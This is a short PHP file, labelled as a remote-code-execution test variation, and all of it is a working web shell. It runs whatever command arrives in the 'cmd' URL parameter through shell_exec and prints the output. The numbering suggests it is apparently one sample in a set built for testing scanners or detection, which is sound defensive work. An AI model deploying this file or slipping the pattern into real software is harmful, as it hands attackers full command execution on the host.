<?php
// RCE test variation #82
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>